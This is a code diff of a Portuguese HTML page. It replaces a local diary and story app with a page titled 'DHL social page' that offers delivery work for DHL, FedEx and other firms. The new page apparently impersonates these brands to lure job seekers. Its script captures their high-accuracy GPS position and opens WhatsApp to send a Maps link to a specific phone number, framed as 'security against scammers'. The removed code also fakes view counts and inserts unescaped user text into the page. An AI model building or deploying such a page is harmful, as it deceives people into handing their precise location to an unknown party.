@@ -1,545 +1,115 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Diário Online - Persistente</title>
-  <style>
-    /* Estilos gerais */
-    body {
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 0;
-      color: #fff;
-      min-height: 100vh;
-      overflow-x: hidden;
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-position: center;
-      transition: background 0.5s ease-in-out;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DHL social page</title>
+    <style>
+            @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(to right, #001f3f, #003366);
+            color: white;
+            text-align: center;
+        }
+
+        /* Cabeçalho estilizado */
+        header {
+            background: url('header.jpg') no-repeat center;
+            background-size: cover;
+            height: 80vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            text-shadow: 2px 2px 5px black;
+            animation: fadeIn 2s ease-in-out;
+        }
+  .anotacao1{
+            background-color: white;
+            padding: 10px;
+            border-left: 4px solid orange;
+            font-weight: bold;
+        color: black;
+    
+  }
+    .anotacao {
+            background-color: yellow;
+            padding: 10px;
+            border-left: 4px solid orange;
+            font-weight: bold;
+        color: black;
+        }
+    .ve{
+   background-color:  #138085;
+            padding: 10px;
+            border-left: 4px solid orange;
+            font-weight: bold;
+        color: white;
+    
     }
-    #main-screen, #register-screen {
-      width: 90%;
-      max-width: 500px;
-      margin: 20px auto;
-      padding: 20px;
-      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.5);
-      border-radius: 15px;
-      background-color: rgba(255, 255, 255, 0.4);
-      color: #333;
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    label, input, select, textarea, button {
-      width: 98%;
-      margin-top: 10px;
-      padding: 10px;
-      font-size: 11px;
-      border: none;
-      border-radius: 5px;
-    }
-    button {
-      background: linear-gradient(135deg, #4adede, #003366);
-      background-size: 200% 200%;
-      color: #fff;
-      cursor: pointer;
-      border: none;
-      border-radius: 8px;
-      padding: 10px 20px;
-      font-size: 16px;
-      font-weight: bold;
-      transition: transform 0.2s, background-color 0.3s;
-      animation: gradientAnimation 5s infinite;
-    }
-    button:hover {
-      transform: scale(1.05);
-      background: linear-gradient(135deg, #ff6c66, #ff7eb3);
-      background-size: 100%;
-    }
-    @keyframes gradientAnimation {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    #main-screen {
-      display: none;
-      overflow-y: auto;
-      max-height: 90vh;
-    }
-    /* Botão para editar dados */
-    #edit-button {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      width: 30px;
-      height: 30px;
-      font-size: 18px;
-      background: none;
-      color: white;
-      border: none;
-      border-radius: 50%;
-      cursor: pointer;
-      z-index: 1000;
-    }
-    /* Botão para alternar filtro de publicações */
-    #filter-other-btn {
-      position: fixed;
-      top: 10px;
-      left: 10px;
-      width: auto;
-      height: 30px;
-      font-size: 14px;
-      background: none;
-      color: white;
-      border: 1px solid #fff;
-      border-radius: 5px;
-      cursor: pointer;
-      z-index: 1000;
-      padding: 0 10px;
-    }
-    .profile-info {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .profile-picture {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 20px;
-    }
-    .profile-picture img {
-      width: 100px;
-      height: 100px;
-      border: 2px dashed #aaa;
-      border-radius: 50%;
-      cursor: pointer;
-      transition: transform 0.3s ease-in-out;
-    }
-    .profile-picture img:hover {
-      transform: scale(1.1);
-    }
-    #story-list {
-      margin-top: 20px;
-    }
-    .story {
-      padding: 10px;
-      margin-bottom: 10px;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      background: linear-gradient(135deg, #003366, #003366);
-      background-size: 200% 200%;
-      animation: gradientMove 3s infinite;
-      color: white;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-    @keyframes gradientMove {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .story img {
-      max-width: 100%;
-      max-height: 200px;
-      object-fit: cover;
-      border-radius: 8px;
-    }
-    .custom-button {
-      display: inline-block;
-      padding: 5px 92px;
-      background: linear-gradient(135deg, #003366, #003366);
-      color: white;
-      text-align: center;
-      border-radius: 25px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-      text-decoration: none;
-      transition: transform 0.2s ease, box-shadow 0.3s ease;
-      border: none;
-      position: relative;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-      margin: 10px auto;
-      max-width: 200px;
-    }
-    .custom-button:hover {
-      transform: translateY(-3px);
-      box-shadow: 0px 6px 10px rgba(0, 0, 0, 0.3);
-    }
-    .custom-button-container {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      gap: 15px;
-      padding: 10px;
-      background: #f0f0f0;
-      border-radius: 10px;
-    }
-    input[type="file"] {
-      display: none;
-    }
-    /* Modal de perfil com botão de voltar */
-    #profile-modal {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background: rgba(0,0,0,0.8);
-      z-index: 2000;
-      justify-content: center;
-      align-items: center;
-    }
-    #profile-modal .modal-content {
-      background: #fff;
-      padding: 20px;
-      border-radius: 10px;
-      width: 90%;
-      max-width: 500px;
-      position: relative;
-      color: #333;
-    }
-    /* Botão de voltar no modal */
-    #back-button {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      font-size: 18px;
-      cursor: pointer;
-      color: #333;
-    }
-    /* Estilo para informações de publicação */
-    .engagement-info {
-      font-size: 13px;
-      color: #ddd;
-      background: rgba(0, 0, 0, 0.3);
-      padding: 5px 10px;
-      border-radius: 5px;
-      display: inline-block;
-      margin-top: 5px;
-    }
-    .engagement-info span {
-      margin-right: 8px;
-    }
-    .show-engagement {
-      background: none;
-      border: none;
-      font-size: 18px;
-      cursor: pointer;
-      color: #fff;
-    }
-  </style>
+
+        .location-btn {
+            padding: 15px 30px;
+            margin: 20px;
+            background: #138085;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .location-btn:hover {
+            background: #0e6065;
+        }
+    </style>
 </head>
 <body>
-  <!-- Botões do canto superior -->
-  <button id="edit-button">🔒</button>
-  <button id="filter-other-btn">Ver Historias</button>
+    <marquee>
+    <h1>Bem-vindo a página de serviços do site.</h1>
+    </marquee>  
+    <p class="anotacao1">Está página é designada apenas para começares a trabalhar fazendo serviços de coordenadas ou de entregas de mercadorias e produtos para várias as empresas e lojas.[DHL, FedEx, Mamboo, Kero, Candando, LunisCafé etc...]</p>
+    <p class="anotacao">Para iniciares o cadastro, para começares a trabalhar, com as entregas ou enviar rotas próximas na tua localidade para os produtos para os mercadores e encomendadores seguirem a localização, é necessário primeiro enviares a tua localizacão.</p>
+    <p class="ve">pois os mercadores e encomendadores precisam saber a tua localização[Província,Município,Bairro]para se cálcular a distancia e tempo de entrega. E para nós poder cálcular a percentagem do teu pagamento.<br>Devido as politicas da empresa, só é possivel enviar pelo nosso WhatsApp, para a máxima segurança contra golpeadores!</p>
 
-  <!-- Tela de cadastro -->
-  <div id="register-screen">
-    <h2>Editar Dados</h2>
-    <form id="register-form">
-      <label for="user-name">Nome:</label>
-      <input type="text" id="user-name" required>
-      <label for="phone-number">Número de Telefone:</label>
-      <input type="text" id="phone-number" required>
-      <label for="gender">Sexo:</label>
-      <select id="gender" required>
-        <option value="" disabled selected>Selecione...</option>
-        <option value="male">Masculino</option>
-        <option value="female">Feminino</option>
-      </select>
-      <button type="submit">Guardar Alterações</button>
-    </form>
-  </div>
+    <button class="location-btn" onclick="capturarLocalizacao()">
+        Enviar Localização
+    </button>
 
-  <!-- Tela principal -->
-  <div id="main-screen">
-    <div class="profile-info">
-      <div class="profile-picture">
-        <img src="default.jpg" alt="Imagem de perfil" id="profile-img">
-        <input type="file" id="upload-img" accept="image/*">
-      </div>
-      <p id="user-info"></p>
-    </div>
-    <!-- Área de publicação -->
-    <label for="background-img" class="custom-button">Imagem de fundo</label>
-    <input type="file" id="background-img" accept="image/*">
-    <textarea id="story-input" placeholder="Escreva sua história aqui..."></textarea>
-    <label for="story-image" class="custom-button">Adicionar imagem</label>
-    <input type="file" id="story-image" accept="image/*">
-    <button id="save-btn" class="custom-button">Enviar</button>
-    <h3 style="text-align:center;">Histórias</h3>
-    <div id="story-list"></div>
-  </div>
+<script>
+        async function capturarLocalizacao() {
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
+                    });
+                });
 
-  <!-- Modal de perfil com botão de voltar -->
-  <div id="profile-modal">
-    <div class="modal-content">
-      <span id="back-button">← Voltar</span>
-      <div id="profile-content"></div>
-    </div>
-  </div>
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                
+                // Passo 1: Gerar link do Google Maps
+                const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
+                
+                // Passo 2: Enviar via WhatsApp (usuário precisa confirmar)
+                window.open(`https://wa.me/244925575612?text=${encodeURIComponent("Localização para o cadastro: " + mapsLink)}`, '_blank');
+                
+                alert("✅ Localização pronta! Confirme o envio no WhatsApp.");
 
-  <script>
-    // Recupera os dados do localStorage ou inicializa com valores vazios
-    let userData = JSON.parse(localStorage.getItem('diaryUserData')) || {
-      name: '',
-      phoneNumber: '',
-      gender: '',
-      stories: [],
-      profilePicture: 'default.jpg',
-      backgroundImage: ''
-    };
-
-    // Controle do filtro: false = mostra todas; true = só publicações de outros usuários
-    let filterOther = false;
-
-    // Seleção de elementos
-    const registerScreen = document.getElementById('register-screen');
-    const mainScreen = document.getElementById('main-screen');
-    const userNameInput = document.getElementById('user-name');
-    const phoneNumberInput = document.getElementById('phone-number');
-    const genderSelect = document.getElementById('gender');
-    const registerForm = document.getElementById('register-form');
-    const editButton = document.getElementById('edit-button');
-    const filterOtherBtn = document.getElementById('filter-other-btn');
-    const profileImg = document.getElementById('profile-img');
-    const uploadImg = document.getElementById('upload-img');
-    const backgroundImgInput = document.getElementById('background-img');
-    const userInfo = document.getElementById('user-info');
-    const storyInput = document.getElementById('story-input');
-    const storyImageInput = document.getElementById('story-image');
-    const saveBtn = document.getElementById('save-btn');
-    const storyList = document.getElementById('story-list');
-    const profileModal = document.getElementById('profile-modal');
-    const profileContent = document.getElementById('profile-content');
-    const backButton = document.getElementById('back-button');
-
-    // Função para salvar os dados no localStorage
-    function saveData() {
-      localStorage.setItem('diaryUserData', JSON.stringify(userData));
-    }
-
-    // Inicializa a aplicação: se o usuário já cadastrou, mostra a tela principal
-    function initializeApp() {
-      if (userData.name !== '') {
-        setupMainScreen();
-        loadStories();
-      } else {
-        registerScreen.style.display = 'block';
-      }
-    }
-
-    function setupMainScreen() {
-      registerScreen.style.display = 'none';
-      mainScreen.style.display = 'block';
-      userInfo.innerHTML = `👤 ${userData.name} <br> 📞 ${userData.phoneNumber}`;
-      profileImg.src = userData.profilePicture;
-      if (userData.backgroundImage) {
-        document.body.style.backgroundImage = `url(${userData.backgroundImage})`;
-      }
-    }
-
-    // Carrega as histórias considerando o filtro
-    function loadStories() {
-      storyList.innerHTML = '';
-      let storiesToShow = filterOther 
-        ? userData.stories.filter(story => story.publisher !== userData.name)
-        : userData.stories;
-      if (storiesToShow.length === 0) {
-        storyList.innerHTML = `<p style="text-align:center;">Sem publicações ${filterOther ? 'de outros usuários' : ''}.</p>`;
-        return;
-      }
-      // Exibe as histórias na ordem inversa (última publicada primeiro)
-      storiesToShow.slice().reverse().forEach((story, index) => {
-        const storyElement = document.createElement('div');
-        storyElement.classList.add('story');
-        let contentHTML = `<p>${story.text}</p>`;
-        if (story.image) {
-          contentHTML += `<img src="${story.image}" alt="Imagem da história">`;
+            } catch (error) {
+                alert("❌ Ative o GPS ou MAPA e permita o acesso à localização!");
+            }
         }
-        // Exibe informações de publicação com ícones e número de telefone
-        if (story.publisher === userData.name) {
-          contentHTML += `
-            <div class="engagement-info">
-              <span>👤 ${story.publisher}</span>
-              <span>📞 ${story.publisherPhone}</span>
-              <span>👁 ${story.fakeViews}</span>
-            </div>
-          `;
-          contentHTML += `<button onclick="deleteStory(${index})">Excluir</button>`;
-        } else {
-          contentHTML += `
-            <button class="show-engagement" onclick="toggleEngagementInfo(this)">Ver Detalhes</button>
-            <div class="engagement-info" style="display:none;">
-              <span>👤 ${story.publisher}</span>
-              <span>📞 ${story.publisherPhone}</span>
-              <span>👁 ${story.fakeViews}</span>
-            </div>
-          `;
-        }
-        storyElement.innerHTML = contentHTML;
-        storyList.appendChild(storyElement);
-      });
-    }
-
-    function deleteStory(index) {
-      userData.stories.splice(index, 1);
-      saveData();
-      loadStories();
-    }
-
-    function toggleEngagementInfo(button) {
-      const infoDiv = button.nextElementSibling;
-      infoDiv.style.display = (infoDiv.style.display === "none" ? "block" : "none");
-    }
-
-    // Alterna entre exibir todas as publicações e somente as de outros usuários
-    filterOtherBtn.addEventListener('click', () => {
-      filterOther = !filterOther;
-      filterOtherBtn.textContent = filterOther ? "Ver Todas" : "Ver Historias";
-      loadStories();
-    });
-
-    // Permite editar os dados do usuário
-    editButton.addEventListener('click', () => {
-      userNameInput.value = userData.name;
-      phoneNumberInput.value = userData.phoneNumber;
-      genderSelect.value = userData.gender;
-      registerScreen.style.display = 'block';
-      mainScreen.style.display = 'none';
-    });
-
-    backgroundImgInput.addEventListener('change', (event) => {
-      const file = event.target.files[0];
-      if (file) {
-        const reader = new FileReader();
-        reader.onload = (e) => {
-          document.body.style.backgroundImage = `url(${e.target.result})`;
-          userData.backgroundImage = e.target.result;
-          saveData();
-        };
-        reader.readAsDataURL(file);
-      }
-    });
-
-    profileImg.addEventListener('click', () => {
-      uploadImg.click();
-    });
-
-    uploadImg.addEventListener('change', (event) => {
-      const file = event.target.files[0];
-      if (file) {
-        const reader = new FileReader();
-        reader.onload = (e) => {
-          profileImg.src = e.target.result;
-          userData.profilePicture = e.target.result;
-          saveData();
-        };
-        reader.readAsDataURL(file);
-      }
-    });
-
-    registerForm.addEventListener('submit', (event) => {
-      event.preventDefault();
-      userData.name = userNameInput.value;
-      userData.phoneNumber = phoneNumberInput.value;
-      userData.gender = genderSelect.value;
-      saveData();
-      setupMainScreen();
-      loadStories();
-    });
-
-    // Salva uma nova história e persiste no localStorage
-    saveBtn.addEventListener('click', (event) => {
-      event.preventDefault();
-      const storyText = storyInput.value;
-      const storyImageFile = storyImageInput.files[0];
-      if (storyText) {
-        const initialViews = Math.floor(Math.random() * 20) + 10; // Número entre 10 e 30
-        // Se houver imagem, converte para Data URL
-        if (storyImageFile) {
-          const reader = new FileReader();
-          reader.onload = function(e) {
-            const imageData = e.target.result;
-            const newStory = {
-              text: storyText,
-              image: imageData,
-              publisher: userData.name,
-              publisherPhone: userData.phoneNumber,
-              fakeViews: initialViews,
-              timestamp: Date.now()
-            };
-            userData.stories.push(newStory);
-            saveData();
-            loadStories();
-            storyInput.value = '';
-            storyImageInput.value = '';
-          };
-          reader.readAsDataURL(storyImageFile);
-        } else {
-          const newStory = {
-            text: storyText,
-            image: null,
-            publisher: userData.name,
-            publisherPhone: userData.phoneNumber,
-            fakeViews: initialViews,
-            timestamp: Date.now()
-          };
-          userData.stories.push(newStory);
-          saveData();
-          loadStories();
-          storyInput.value = '';
-          storyImageInput.value = '';
-        }
-      }
-    });
-
-    // Atualiza os views de todas as publicações a cada 30 segundos
-    function updateViews() {
-      let updated = false;
-      userData.stories.forEach(story => {
-        let incremento = Math.floor(Math.random() * 11) + 5; // Incremento entre 5 e 15
-        story.fakeViews += incremento;
-        updated = true;
-      });
-      if (updated) {
-        saveData();
-        loadStories();
-      }
-    }
-    setInterval(updateViews, 30000);
-
-    // Botão "← Voltar" no modal de perfil
-    backButton.addEventListener('click', () => {
-      profileModal.style.display = "none";
-    });
-
-    // Exibe o perfil do usuário (modo somente leitura)
-    function viewUserProfile(user) {
-      profileContent.innerHTML = `
-        <h2>${user.name}</h2>
-        <img src="${user.profilePicture}" alt="${user.name}" style="width:100px; height:100px; border-radius:50%;">
-        <p>📞 ${user.phoneNumber}</p>
-        <p>Sexo: ${user.gender}</p>
-      `;
-      profileModal.style.display = "flex";
-    }
-
-    // Fecha o modal de perfil ao clicar fora do conteúdo
-    profileModal.addEventListener('click', (event) => {
-      if (event.target === profileModal) {
-        profileModal.style.display = "none";
-      }
-    });
-
-    // Inicializa a aplicação
-    initializeApp();
-  </script>
+    </script>
 </body>
 </html>
